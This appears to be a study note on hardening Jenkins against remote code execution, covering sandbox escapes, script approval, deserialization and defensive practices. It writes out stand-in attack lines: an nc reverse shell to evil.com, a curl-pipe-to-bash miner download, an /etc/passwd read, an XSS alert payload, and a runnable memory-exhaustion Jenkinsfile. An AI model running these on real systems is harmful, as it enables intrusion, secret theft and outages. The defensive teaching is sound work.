# 🔐 Sandbox and Script Security

## 📌 Topic Name
Securing the JVM: RCE Prevention and Jenkinsfile Hardening

## 🧠 Concept Explanation (Basic → Expert)
*   **Basic**: Stopping bad actors from writing code in a Jenkinsfile that takes over the Jenkins server.
*   **Expert**: Because Jenkins executes Pipelines as native Groovy inside the Controller's JVM, it is highly susceptible to **Remote Code Execution (RCE)**. The Groovy Sandbox mitigates this via AST interception, but it is not impenetrable. A Staff engineer must protect against **Sandbox Escapes**, **Deserialization Vulnerabilities** (via XStream/Remoting), and **System Groovy Script abuse**. True security requires a defense-in-depth approach: limiting who can merge Jenkinsfiles, aggressive plugin updating, and isolating the Controller network.

## 🏗️ Mental Model
Think of Jenkins as a **Nuclear Reactor Control Room**.
- **The Reactor (Controller JVM)**: Incredibly powerful, runs the whole facility.
- **The Operators (Developers)**: Send instructions (Jenkinsfiles) to the control room.
- **The Sandbox (Safety Glass)**: The operators are behind safety glass. They can press approved buttons (Native Steps like `sh` or `git`).
- **The Vulnerability**: If an operator finds a crack in the glass (Sandbox Escape) or convinces the Manager to open the door (Blind Script Approval), they can walk up to the core and shut it down.

## ⚡ Actual Behavior
- **Script Console**: The `/script` URL in Jenkins allows any Admin to execute raw, unsandboxed Groovy directly on the Controller. This is literally an RCE-as-a-Service feature. Protecting admin access is paramount.
- **Deserialization Hacks**: Many historical Jenkins CVEs involved sending maliciously crafted binary payloads to the Jenkins CLI or Remoting ports. When Jenkins deserialized the Java object, the object's constructor executed malware.

## 🔬 Internal Mechanics (Jenkins core + OS + networking)
1.  **Sandbox Escapes**: Hackers find obscure Java reflection methods or meta-programming tricks in Groovy that the Sandbox Interceptor missed. If they execute `java.lang.Runtime.getRuntime().exec("nc evil.com 4444 -e /bin/sh")`, they get a reverse shell.
2.  **In-Process Script Approval**: As discussed previously, this is a human vulnerability. An admin gets tired of clicking "Approve" and blindly approves a dangerous signature like `method groovy.lang.GroovyObject invokeMethod java.lang.String java.lang.Object`.
3.  **Cross-Site Scripting (XSS)**: If a plugin improperly sanitizes a build parameter (e.g., a user names a branch `<script>alert('pwned')</script>`), an admin viewing the build page will execute the JS in their browser, potentially stealing their Admin session cookie.

## 🔁 Execution Flow (Anatomy of an Attack)
1.  **Reconnaissance**: Attacker finds an exposed Jenkins instance.
2.  **Exploitation**: Attacker opens a Pull Request on a public GitHub repo with a modified `Jenkinsfile`.
3.  **Bypass**: The `Jenkinsfile` contains a clever Groovy meta-programming trick that bypasses the AST Sandbox validation.
4.  **Payload Execution**: The code runs in the Controller JVM. It reads `$JENKINS_HOME/secrets/master.key` and `credentials.xml`.
5.  **Exfiltration**: The code makes an HTTP POST to the attacker's server with the decrypted AWS keys.

## 🧠 Resource Behavior (CPU, memory, IO, threads)
- **Denial of Service (DoS)**: Even if the sandbox prevents RCE, it does not prevent resource exhaustion. A malicious Jenkinsfile can run `while(true) {}` or allocate massive arrays until the JVM hits `OutOfMemoryError`, taking down the server.

## 📐 ASCII Diagrams (MANDATORY)
```text
[ ATTACKER ]
      |
 (Malicious Jenkinsfile PR)
      v
[ GITHUB ] ---> (Webhook) ---> [ JENKINS CONTROLLER ]
                                     |
                                [ CPS ENGINE ]
                                     |
    +--------------------------------+--------------------------------+
    |                                |                                |
[ SANDBOX ]                     [ ESCAPE! ]                    [ OOM ATTACK ]
 (Intercepts File.read)    (Uses unchecked Reflection)   (Allocates 10GB array)
    |                                |                                |
 (Blocks Attack)           [ REVERSE SHELL TO HOST ]      [ JVM CRASHES (DoS) ]
```

## 🔍 Code (Jenkinsfile / Groovy / CLI / YAML)
```groovy
// DANGEROUS CODE EXAMPLES

// 1. Classic RCE (Will be blocked by Sandbox, but terrifying if approved)
// def process = "cat /etc/passwd".execute()
// println process.text

// 2. Resource Exhaustion (Sandbox does NOT block this)
// This will crash the Jenkins Controller JVM
pipeline {
    agent any
    steps {
        script {
            List<String> memoryLeak = []
            while(true) {
                memoryLeak.add("EAT_MEMORY" * 10000)
            }
        }
    }
}
```

## 💥 Production Failures
1.  **The Crypto-Miner Botnet**: A Jenkins server without authentication (or weak passwords) is exposed to the internet. Hackers use the Script Console to launch crypto-mining processes on the Controller and all connected Agents.
2.  **Blind Approval Compromise**: A DevOps engineer approves a script signature requested by a developer. That signature allowed arbitrary file reading. The developer accidentally prints the Jenkins master configuration file to the build logs, exposing corporate proxy passwords.
3.  **Remoting Port Scan**: Jenkins is running on a cloud VM. Port 50000 (Remoting) is accidentally left open to `0.0.0.0/0` in the Security Group. An attacker sends a crafted serialized Java payload to port 50000 and gains RCE.

## 🧪 Real-time Q&A
*   **Q**: How can I secure the Jenkinsfile execution?
*   **A**: You must assume that any code executed inside the `Jenkinsfile` is potentially hostile. The primary defense is **SCM Governance**: enforce branch protection rules on GitHub so no PR can merge (and run trusted CI) without peer review.
*   **Q**: Should I disable the Script Console?
*   **A**: While it's a security risk, it's often the only way to recover a broken Jenkins instance or debug complex CPS state issues. Limit access to only 1-2 highly trusted Principals via strict RBAC.

## ⚠️ Edge Cases
*   **Agent to Controller Attacks**: If an Agent is compromised (e.g., a vulnerable Docker image is built and executed), the attacker is on the Agent. They can attempt to use the Remoting channel to attack the Controller. Jenkins introduced the **Agent-to-Controller Security Subsystem** to restrict what RPC calls an Agent is allowed to make to the Controller to mitigate this.

## 🏢 Best Practices
1.  **Aggressive Patching**: Jenkins core and plugins have frequent CVEs. You must have a process to update Jenkins at least monthly.
2.  **Network Isolation**: The Jenkins UI should be behind a VPN or Zero-Trust Proxy (like Cloudflare Access). Port 50000 should only accept traffic from known Agent VPCs.
3.  **Review Sandbox Approvals**: Periodically review the "In-Process Script Approval" page. If you see highly generic signatures (`java.lang.Object`), investigate immediately.

## ⚖️ Trade-offs
*   **Developer Freedom vs Platform Security**: Allowing developers to write complex Groovy in Jenkinsfiles allows them to solve problems quickly, but turns your CI server into a massive security risk. Pushing logic to `bash`/`make`/`npm` running on isolated Agents is vastly safer.

## 💼 Interview Q&A
*   **Q**: You notice a spike in CPU on the Jenkins Controller. You investigate and find that the Jenkins Java process has spawned a child bash process running `curl evil.com/miner.sh | bash`. The Jenkins UI is completely locked down with SSO. How did this happen?
*   **A**: This is a Remote Code Execution (RCE) breach. If the UI is secure, the attacker likely bypassed authentication by exploiting a vulnerability in a public-facing endpoint, such as a Webhook receiver, or by exploiting an unauthenticated Deserialization CVE on the Jenkins CLI or Remoting port. Alternatively, an insider (or someone with Git access) pushed a malicious Jenkinsfile that bypassed the Groovy Sandbox. I would immediately isolate the server, kill the process, and analyze the HTTP access logs and Git commit history.

## 🧩 Practice Problems
1.  Navigate to `https://<your-jenkins>/script` (The Script Console). Run `println System.getenv()`. Understand why giving someone access to this page is giving them root access.
2.  Review the "Agent-to-Controller Security" settings in the Global Security configuration page to understand how Jenkins protects itself from compromised worker nodes.
